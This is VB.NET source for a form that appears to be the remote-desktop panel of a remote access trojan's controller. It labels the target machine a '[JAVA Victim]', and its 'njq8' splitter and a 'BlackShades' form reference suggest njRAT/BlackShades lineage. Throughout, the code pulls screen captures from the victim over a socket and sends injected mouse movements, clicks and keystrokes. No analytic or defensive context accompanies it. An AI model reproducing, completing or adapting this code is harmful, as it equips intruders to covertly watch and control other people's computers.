Public Class RDP
    Public sock As Integer
    Private SPLITTER As String = SplitData
    Private WithEvents Timer1 As New Timer
    Private isjava As Boolean
    Private op As New Point(1, 1)
    Protected Friend Sz As Size
    Friend real_w As Integer = 0
    Friend real_h As Integer = 0
    Protected Friend c1, c2 As New ComboBox
    Private Sub RDP_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Timer1.Interval = 500
    End Sub
    Private Sub Timer1_Tick() Handles Timer1.Tick
        If isjava = True Then
            If Button2.Enabled = True Then
                ' Main.Send_From_Children(Sock, "getimg")
                Form1.Server.Send(sock, "getimg" & SPLITTER & PictureBox1.Size.Width & SPLITTER & PictureBox1.Size.Height & SPLITTER)

            Else

                Exit Sub
            End If
        Else
            If Button2.Enabled = True Then
                Form1.Server.Send(sock, "@" & SPLITTER & c1.SelectedIndex & SPLITTER & c2.Text & SPLITTER & "85")

            Else
                Exit Sub
            End If
        End If
    End Sub
    Protected Friend Sub it_is_JAVA()
        ' صندوق1.Enabled = False
        '  صندوق2.Enabled = False
        isjava = True
        Me.Text &= "  [JAVA Victim]"
    End Sub
    Protected Friend Sub start_cap()
    
        'start
        Button1.Enabled = False
        Button2.Enabled = True

        If isjava = True Then
            If Button2.Enabled = True Then
                ' Main.Send_From_Children(Sock, "getimg")
                Form1.Server.Send(sock, "getimg" & SPLITTER & PictureBox1.Size.Width & SPLITTER & PictureBox1.Size.Height & SPLITTER)
                 
            Else

                Exit Sub
            End If
        Else
            If Button2.Enabled = True Then
                Form1.Server.Send(sock, "@" & SPLITTER & c1.SelectedIndex & SPLITTER & c2.Text & SPLITTER & "85")
  
            Else
                Exit Sub
            End If
        End If

    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        start_cap()
        Timer1.Start()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Button1.Enabled = True
        Button2.Enabled = False
        'Stop
        Timer1.Stop()
        PictureBox1.Image = Nothing
         Form1.Server.Send(sock, "dsktop" & SPLITTER)
    End Sub
    Private Function Return_Byte_array(ByVal s As String) As Byte() ' string to byte array
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Private Function Return_String(ByVal b As Byte()) As String ' byte array to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Private Function Clear_Packets_From_Splitter_String(ByVal Incomming_Byte_Aray As Byte(), ByVal Splitter_Str As String) As Array ' clear incomming packets from splitter
        On Error Resume Next
        Dim Array_List As New List(Of Byte())
        Dim Stream1 As New IO.MemoryStream
        Dim Stream2 As New IO.MemoryStream
        Dim T As String() = Split(Return_String(Incomming_Byte_Aray), Splitter_Str)
        Stream1.Write(Incomming_Byte_Aray, 0, T(0).Length)
        Stream2.Write(Incomming_Byte_Aray, T(0).Length + Splitter_Str.Length, Incomming_Byte_Aray.Length - (T(0).Length + Splitter_Str.Length))
        Array_List.Add(Stream1.ToArray)
        Array_List.Add(Stream2.ToArray)
        Stream1.Dispose()
        Stream2.Dispose()
        Return Array_List.ToArray
    End Function

    Public Sub PktToImage(ByVal BY As Byte(), ByVal array_from_java As Image)
        If isjava = False Then
            If op = Nothing Then
            Else
                If Button2.Enabled = True Then
                    Dim pp As New Point(0, 0)
                    pp.X = op.X
                    pp.Y = op.Y
                    op = Nothing
                    If صندوق1.Checked = True Then
                        Form1.Server.Send(sock, "$" & SPLITTER & pp.X & SPLITTER & pp.Y & SPLITTER)
                    End If

                End If

            End If
            If Button2.Enabled = True Then
                Form1.Server.Send(sock, "@" & SPLITTER & c1.SelectedIndex & SPLITTER & c2.Text & SPLITTER & "85")
            Else
                Exit Sub
            End If

            Dim B As Array = Clear_Packets_From_Splitter_String(BY, "njq8")
            Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
            Dim L As Bitmap = Image.FromStream(Q)
            Dim QQ As String() = Split(Return_String(B(0)), ",")
            Try
                '  Me.BlackShadesNetForm1.Text = "Remote Desktop " & "Size: " & siz(BY.LongLength) & " ,Changes: " & QQ.Length - 2
            Catch ex As Exception
                Exit Try
            End Try
            Dim K As Bitmap = PictureBox1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
            Dim G As Graphics = Graphics.FromImage(K)
            Dim tp As Integer = 0
            For i As Integer = 1 To QQ.Length - 2
                Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
                Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
                G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))

                tp += SZ.Height
            Next
            G.Dispose()
            PictureBox1.Image = K


        Else 'This is from Java 
            If Button2.Enabled = True Then

                PictureBox1.Image = array_from_java
                If صندوق1.Checked = True Then
                    Dim pp As New Point(0, 0)
                    pp.X = op.X
                    pp.Y = op.Y
                    op = Nothing
                    'MsgBox("$" & SPLITTER & pp.X & SPLITTER & pp.Y & SPLITTER)
                    Form1.Server.Send(sock, "$" & SPLITTER & pp.X & SPLITTER & pp.Y & SPLITTER)
                End If

            Else

                Exit Sub
            End If
        End If


    End Sub
    Private Sub Keyboard_Key_Pressed(ByVal sender As Object, ByVal e As KeyEventArgs) Handles Me.KeyDown
        If صندوق2.Checked = True Then
            If isjava = True Then
                Form1.Server.Send(sock, "code" & SPLITTER & e.KeyValue)
            End If

        End If
    End Sub
    Private Sub Keyboard_Key_Pressed_X(ByVal sender As Object, ByVal e As KeyPressEventArgs) Handles Me.KeyPress
        If صندوق2.Checked = True Then
            Dim keyp As String = e.KeyChar
            Form1.Server.Send(sock, "ke" & SPLITTER & CType(keyp, String))

        End If
    End Sub
    Private Sub p1_MouseDown(sender As System.Object, e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseDown
        If صندوق1.Checked = True Then
            Dim PP = New Point(e.Location.X * (real_w / PictureBox1.Width), e.Location.Y * (real_h / PictureBox1.Height))


            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
                If isjava = True Then
                    Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & "pres-l" & SPLITTER)
                    Exit Sub
                End If
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
                If isjava = True Then
                    Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & "pres-r" & SPLITTER)
                    Exit Sub
                End If
            End If

            Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & but)
        End If


    End Sub

    Private Sub p1_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseUp
        If صندوق1.Checked = True Then
            Dim PP = New Point(e.Location.X * (real_w / PictureBox1.Width), e.Location.Y * (real_h / PictureBox1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
                If isjava = True Then
                    Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & "rels-l")
                    Exit Sub
                End If
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
                If isjava = True Then
                    Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & "rels-r")
                    Exit Sub
                End If
            End If
            Form1.Server.Send(sock, "#" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER & but)
        End If


    End Sub
    Private Sub p1_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseMove
        If صندوق1.Checked = True Then
            Dim PP = New Point(e.Location.X * (real_w / PictureBox1.Width), e.Location.Y * (real_h / PictureBox1.Height))
            If PP <> op Then
                op = PP
                Form1.Server.Send(sock, "$" & SPLITTER & PP.X & SPLITTER & PP.Y & SPLITTER)
            End If

        End If

    End Sub
    Function QZ(ByVal q As Integer) As Size
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function

    Protected Friend Sub After_Load()

        If isjava = True Then
            Exit Sub

        Else
            For i As Integer = 0 To 13
                c1.Items.Add(QZ(i))
            Next
            For i As Integer = 1 To 10
                c2.Items.Add(i)
            Next

            PictureBox1.Image = New Bitmap(Sz.Width, Sz.Height)

            c1.SelectedIndex = 3
            c2.SelectedIndex = 2
        End If


    End Sub

    
 

   
End Class